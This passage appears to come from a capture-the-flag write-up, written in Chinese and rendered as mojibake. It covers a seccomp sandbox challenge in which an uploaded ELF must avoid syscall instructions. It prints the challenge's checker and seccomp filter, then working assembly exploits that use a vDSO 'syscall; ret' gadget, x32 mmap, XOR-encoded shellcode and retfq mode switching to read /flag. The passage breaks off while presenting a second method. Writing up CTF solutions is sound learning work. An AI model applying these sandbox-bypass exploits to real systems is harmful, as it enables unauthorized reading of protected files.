class="hljs-built_in">int</span>(sys.stdin.readline())<br>        phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>        u = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, t, phi)<br>        w = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, u, n)<br>        <span class="hljs-keyword">if</span> w == sol:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Correct!&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Wrong Answer!&#x27;</span>)<br>            exit()<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid Input!&#x27;</span>)<br>        exit()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_bytes</span>(<span class="hljs-params">data, b</span>):<br>    p = -<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = data.find(b, p+<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> p == -<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">elif</span> p &amp; <span class="hljs-number">0xfff</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> p &amp; <span class="hljs-number">0xfff</span> == <span class="hljs-number">0xfff</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_elf</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) &lt; <span class="hljs-number">0x40</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Incomplete ELF Header&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data.startswith(<span class="hljs-string">b&#x27;\x7fELF\x02\x01\x01&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">9</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid ELF Magic&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\xcd\x80&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;\x0f\x05&#x27;</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad Instruction&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\xcd&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x80&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x0f&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x05&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad Instruction&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    elf = ELFFile(BytesIO(data))<br>    <span class="hljs-keyword">if</span> ((elf.header.e_type != <span class="hljs-string">&#x27;ET_EXEC&#x27;</span> <span class="hljs-keyword">and</span> elf.header.e_type != <span class="hljs-string">&#x27;ET_DYN&#x27;</span>)<br>        <span class="hljs-keyword">or</span> elf.header.e_version != <span class="hljs-string">&#x27;EV_CURRENT&#x27;</span><br>        <span class="hljs-keyword">or</span> elf.header.e_ehsize != <span class="hljs-number">0x40</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phoff != <span class="hljs-number">0x40</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phnum &lt;= <span class="hljs-number">0</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad ELF Header&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">for</span> seg <span class="hljs-keyword">in</span> elf.iter_segments():<br>        <span class="hljs-keyword">if</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_INTERP&#x27;</span> <span class="hljs-keyword">or</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_DYNAMIC&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;No dynamic link&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_flags &amp; P_FLAGS.PF_W <span class="hljs-keyword">and</span> seg.header.p_flags &amp; P_FLAGS.PF_X:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;W^X&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_filesz &gt; <span class="hljs-built_in">len</span>(data) <span class="hljs-keyword">or</span> seg.header.p_memsz &gt; <span class="hljs-built_in">len</span>(data):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Segment too large&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">try</span>:<br>        size = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Size of your ELF: &#x27;</span>))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid size!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> size &lt;= <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> size &gt; <span class="hljs-number">0x10000</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad size!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ELF File:&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        data = sys.stdin.buffer.read(size)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid file data&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) != size:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Incomplete file data&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ELF Received: %d bytes&#x27;</span> % <span class="hljs-built_in">len</span>(data))<br>    <span class="hljs-keyword">if</span> check_elf(data):<br>        filename = sha256(data).hexdigest()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;File Hash: %s&#x27;</span> % filename)<br>        path = <span class="hljs-string">&#x27;./data/&#x27;</span> + filename<br>        <span class="hljs-keyword">if</span> os.path.exists(path):<br>            os.unlink(path)<br>        <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;wb&#x27;</span>).write(data)<br>        os.chmod(path, <span class="hljs-number">0o555</span>)<br>        <span class="hljs-keyword">try</span>:<br>            p = subprocess.Popen([<span class="hljs-string">&#x27;docker&#x27;</span>, <span class="hljs-string">&#x27;run&#x27;</span>, <span class="hljs-string">&#x27;-i&#x27;</span>, <span class="hljs-string">&#x27;--rm&#x27;</span>, <span class="hljs-string">&#x27;-v&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;path&#125;</span>:/<span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>, <span class="hljs-string">&#x27;challenge&#x27;</span>, filename], stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)<br>            p.wait()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Return status: %d&#x27;</span> % p.returncode)<br>            <span class="hljs-keyword">if</span> p.returncode == <span class="hljs-number">137</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Output:&#x27;</span>)<br>                sys.stdout.buffer.write(p.stdout.read())<br>                <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Something went wrong!&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> proof_of_work():<br>        main()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bye!&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œä½†å¯¹æ–‡ä»¶è¿›è¡Œäº†é™åˆ¶</p><ul><li>banäº† <strong>int 80</strong> å’Œ <strong>syscall</strong>ï¼Œè€ƒè™‘äº†æŒ‡ä»¤è·¨é¡µçš„æƒ…å†µ</li><li>ELF Header<ul><li>å¿…é¡»ä¸ºåŠ¨æ€ &#x2F; é™æ€é“¾æ¥å¯æ‰§è¡Œæ–‡ä»¶</li><li>ELF Headerå¤§å°0x40</li><li>æœ‰æ®µè¡¨ä¸”æ®µè¡¨åœ¨ELF Headerä¹‹å</li></ul></li><li>segments<ul><li>æ²¡æœ‰åŠ¨æ€é“¾æ¥æ®µå’Œè§£é‡Šå™¨ä¿¡æ¯ï¼ˆé™æ€é“¾æ¥æ–‡ä»¶ï¼‰</li><li>ä¸èƒ½æœ‰wxæ®µ</li><li>ä¸èƒ½æœ‰å¤§äºELFå¤§å°çš„æ®µ</li></ul></li></ul><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><p>æ²™ç®±</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br><span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0c</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) <span class="hljs-keyword">goto</span> <span class="hljs-number">0014</span><br><span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br><span class="hljs-number">0003</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x11</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span><br><span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x10</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000000c</span>  <span class="hljs-keyword">if</span> (A == brk) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span><br><span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x0f</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000e7</span>  <span class="hljs-keyword">if</span> (A == exit_group) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span><br><span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x0e</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x40000001</span>  <span class="hljs-keyword">if</span> (A == x32_write) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span><br><span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x0d</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x40000009</span>  <span class="hljs-keyword">if</span> (A == x32_mmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span><br><span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x0c</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x4000000b</span>  <span class="hljs-keyword">if</span> (A == x32_munmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span><br><span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0c</span> <span class="hljs-number">0x0000003b</span>  <span class="hljs-keyword">if</span> (A != execve) <span class="hljs-keyword">goto</span> <span class="hljs-number">0022</span><br><span class="hljs-number">0010</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000014</span>  A = filename &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># execve(filename, argv, envp)</span><br><span class="hljs-number">0011</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0a</span> <span class="hljs-number">0x00007fff</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x7fff</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0022</span><br><span class="hljs-number">0012</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000010</span>  A = filename <span class="hljs-meta"># execve(filename, argv, envp)</span><br><span class="hljs-number">0013</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x08</span> <span class="hljs-number">0xffffefe5</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0xffffefe5</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> <span class="hljs-number">0022</span><br><span class="hljs-number">0014</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0022</span><br><span class="hljs-number">0015</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br><span class="hljs-number">0016</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == write) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span> ; <span class="hljs-built_in">exit</span><br><span class="hljs-number">0017</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000006</span>  <span class="hljs-keyword">if</span> (A == lstat) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span> ; close<br><span class="hljs-number">0018</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00000005</span>  <span class="hljs-keyword">if</span> (A != fstat) <span class="hljs-keyword">goto</span> <span class="hljs-number">0022</span> ; open<br><span class="hljs-number">0019</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000018</span>  A = statbuf <span class="hljs-meta"># fstat(fd, statbuf)</span><br><span class="hljs-number">0020</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0022</span><br><span class="hljs-number">0021</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br><span class="hljs-number">0022</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL<br></code></pre></td></tr></table></figure><ul><li>64ä½ï¼šå…è®¸readï¼Œx32_writeï¼Œx32_mmap</li><li>32ä½ï¼šå…è®¸open</li></ul><p><em>ä¸»è¦é—®é¢˜æ˜¯æ€ä¹ˆé€ syscall</em></p><h3 id="vdso"><a href="#vdso" class="headerlink" title="vdso"></a>vdso</h3><p>è™½ç„¶åªèƒ½åŠ è½½é™æ€é“¾æ¥ELFä½†vsdoè¿˜æ˜¯ä¼šåŠ è½½è¿›å†…å­˜ï¼Œä¸”rxæƒé™çš„vdsoä¸­æ˜¯æœ‰syscallçš„</p><p>å…ˆæ”¾ELFå†æ…¢æ…¢è§£é‡Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs assembly">; compile with: nasm -felf64 exp.s &amp;&amp; ld -N exp.o &amp;&amp; strip -s ./a.out<br>; ld -N will put all segment together (make file much smaller), <br>; but will create RWX segment<br>; use 010 editor to modify segment header, mark it as RX<br><br>global    _start<br>section   .text<br><br>_start:<br>    mov rdi, rsp<br>; find vdso address on stack<br>find_vdso_l1:<br>    cmp    QWORD [rdi],0x21<br>    je     find_vdso_l2<br>    add    rdi,0x8<br>    jmp    find_vdso_l1<br>find_vdso_l2: <br>    mov    rax, QWORD [rdi+0x8] ; rax store vdso ptr<br>; search for `syscall; ret` in vdso<br>find_syscall_ret_l1:<br>    cmp    BYTE [rax],0xf<br>    jne    find_syscall_ret_l2<br>    cmp    BYTE [rax+0x1],0x5<br>    jne    find_syscall_ret_l2<br>    cmp    BYTE [rax+0x2],0xc3<br>    je     find_syscall_ret_l3<br>find_syscall_ret_l2:<br>    inc    rax<br>    jmp    find_syscall_ret_l1<br>find_syscall_ret_l3:<br>    mov r15, rax<br>mmap_32bit_stack:<br>    mov eax, 0x40000009<br>    mov edi, 0x19260000-0x1000<br>    mov esi, 0x2000<br>    mov edx, 7<br>    mov r10, 0x22<br>    mov r8, 0<br>    mov r9, 0<br>    call r15 ; call syscall<br>    ; mmap_x32(0x19260000-0x1000, 0x2000, RWX, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0)<br>mmap_32bit_shellcode:<br>    mov eax, 0x40000009<br>    mov edi, 0x19290000<br>    mov esi, 0x2000<br>    mov edx, 7<br>    mov r10, 0x22<br>    mov r8, 0<br>    mov r9, 0<br>    call r15 ; call syscall<br>    ; mmap_x32(0x19290000, 0x2000, RWX, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0)<br><br>xor_shellcode_l1:<br>    xor    eax,eax<br>    lea    rdi,[sc]<br>    mov    rsi,0x19290000<br>    mov    rdx,QWORD [sc_len]<br>xor_shellcode_l2:<br>    cmp    rdx,rax<br>    je     jump_to_shellcode<br>    mov    cl,BYTE [rdi+rax*1]<br>    xor    ecx,0x1<br>    mov    BYTE [rsi+rax*1],cl<br>    inc    rax<br>    jmp    xor_shellcode_l2<br><br>jump_to_shellcode:<br>    mov rsp, 0x19260000<br>    mov rax, 0x19290000<br>    jmp rax<br><br>; message:  db        &quot;test output!!!!!&quot;, 0      ; note the newline at the end<br>sc:       db        0xbd, 0x1, 0x4, 0x27, 0x18, 0x6b, 0x22, 0x69, 0xf, 0x1, 0x28, 0x18, 0x49, 0xca, 0xb9, 0x4, 0x1, 0x1, 0x1, 0x6b, 0x66, 0x69, 0x2e, 0x67, 0x6d, 0x60, 0x88, 0xe2, 0x30, 0xc8, 0xcc, 0x81, 0x6b, 0x32, 0x69, 0x28, 0x1, 0x28, 0x18, 0x49, 0xca, 0x30, 0xc1, 0xbe, 0x2, 0x1, 0x1, 0x1, 0xbf, 0x1, 0x9, 0x27, 0x18, 0xbb, 0x1, 0x0, 0x1, 0x1, 0xe, 0x4, 0xb9, 0x0, 0x1, 0x1, 0x41, 0xbe, 0x0, 0x1, 0x1, 0x1, 0xbf, 0x1, 0x9, 0x27, 0x18, 0xbb, 0x1, 0x0, 0x1, 0x1, 0xe, 0x4, 0x6b, 0x22, 0x69, 0x5a, 0x1, 0x28, 0x18, 0x49, 0xca, 0xb9, 0x0, 0x1, 0x1, 0x1, 0xba, 0x88, 0x1, 0x1, 0x1, 0xcc, 0x81<br>sc_len:   dq        103<br></code></pre></td></tr></table></figure><ul><li><p>æ ˆä¸Šä¼šæœ‰vsdoçš„åŸºå€ï¼Œåœ¨envpä¹‹åçš„auxvæ•°ç»„ä¸­ï¼ŒAT_SYSINFO_EHDRï¼ˆ0x21ï¼‰é¡¹å°±æ˜¯vdsoçš„åœ°å€</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/stack.png" class title="stack"><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/vdso.png" class title="vdso"></li><li><p>ç„¶åå°±åœ¨vdsoä¸­æœç´¢syscall</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/syscallret.png" class title="syscallret"></li><li><p>32ä½mmapä¸€æ®µå†…å­˜ï¼Œç”¨ä½œstackï¼ˆ0x40000000ä»¥ä¸Šçš„ç³»ç»Ÿè°ƒç”¨å·æ˜¯64ä½ä¸‹æ‰§è¡Œ32ä½ç³»ç»Ÿè°ƒç”¨ï¼‰</p><p>ç”±äºä¹‹åè¦è½¬æ¢æˆ32ä½ï¼Œéœ€è¦æ ˆé«˜8å­—èŠ‚ä¸º0ï¼Œæ‰€ä»¥è¦é‡æ–°mmapä¸€æ®µæ ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">mmap_x32(<span class="hljs-number">0x19260000</span><span class="hljs-number">-0x1000</span>, <span class="hljs-number">0x2000</span>, RWX, MAP_ANONYMOUS | MAP_PRIVATE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/mmap32.png" class title="mmap32 % } {% asset_img mmap1.png mmap1"></li><li><p>å†mmapä¸€æ®µå†…å­˜ï¼Œç”¨äºå†™shellcode</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/mmap2.png" class title="mmap2"></li><li><p>å°†è¦æ‰§è¡Œçš„shellcodeè§£ç èµ‹å€¼è‡³0x19290000</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>    global _start<br><br>_start:<br>    ; mov eax, 0x40000009<br>    ; ; mov eax, 0x9<br>    ; mov edi, 0x19260000<br>    ; mov esi, 0x1000<br>    ; mov edx, 0x7<br>    ; mov r10d, 0x22<br>    ; mov r8d, -1<br>    ; mov r9d, 0<br>    ; syscall<br><br>    mov rsp, 0x19260500<br>    push 0x23 ; CS<br>    push 0x1929000e ; _open<br>    retfq<br><br>_open:<br>    mov eax, 5<br>    push 0x0067<br>    push 0x616c662f ; /flag<br>    mov ebx, esp<br>    xor ecx, ecx<br>    int 0x80<br><br>    push 0x33 ; CS<br>    push 0x19290029 ; _read<br>    retfq<br><br>_read:<br>    xor eax, eax<br>    mov rdi, 3<br>    mov rsi, 0x19260800<br>    mov rdx, 0x100<br>    syscall<br><br>_write:<br>    mov rax, 0x40000001<br>    mov rdi, 1<br>    mov rsi, 0x19260800<br>    mov rdx, 0x100<br>    syscall<br><br>    push 0x23 ; CS<br>    push 0x1929005b ; _exit<br>    retfq<br><br>_exit:<br>    mov eax, 1<br>    mov ebx, 137<br>    int 0x80<br></code></pre></td></tr></table></figure><ul><li><p>openéœ€è¦32ä½</p><ul><li>å¯ä»¥ä½¿ç”¨retfqï¼ˆç›¸å½“äºpop rip; pop cs;ï¼‰åˆ‡æ¢æ¶æ„ï¼ˆ32ä½æ¶æ„csä¸º0x23ï¼‰</li><li>æˆ–è€…ç›´æ¥64ä½ä¸‹ç›´æ¥int 0x80ï¼Œéœ€è¦ä¿è¯æ ˆå’Œè¿”å›åœ°å€é«˜32ä½ä¸º0</li><li><strong>æ³¨æ„int 0x80ä¼ å‚ï¼šebxï¼Œecxï¼Œedxï¼Œesiï¼Œedi</strong></li></ul><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/open.png" class title="open"></li><li><p>ç„¶åæ­£å¸¸64ä½readï¼Œx32_write</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/read.png" class title="read"><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/write.png" class title="write"></li></ul></li></ul><h3 id="GNU-STACK"><a href="#GNU-STACK" class="headerlink" title="GNU_STACK"></a>GNU_STACK</h3><p>ä¿®æ”¹GNU_STACK p_flags ä¸ºXï¼Œæ ˆé»˜è®¤å¯è¯»å†™ï¼Œç”±äºå†…æ ¸å®ç°åŸå› æ­¤æ—¶æ ˆæ˜¯rwxçš„</p><p>åˆ†äº†ä¸‰æ®µshellcode</p><ul><li><p>shellcode1ï¼ˆexpï¼‰æŠŠshellcode2ï¼ˆsc_mmapï¼‰æ‹·è´åˆ°æ ˆä¸Šï¼Œè§£ç å¹¶æ‰§è¡Œä¹‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 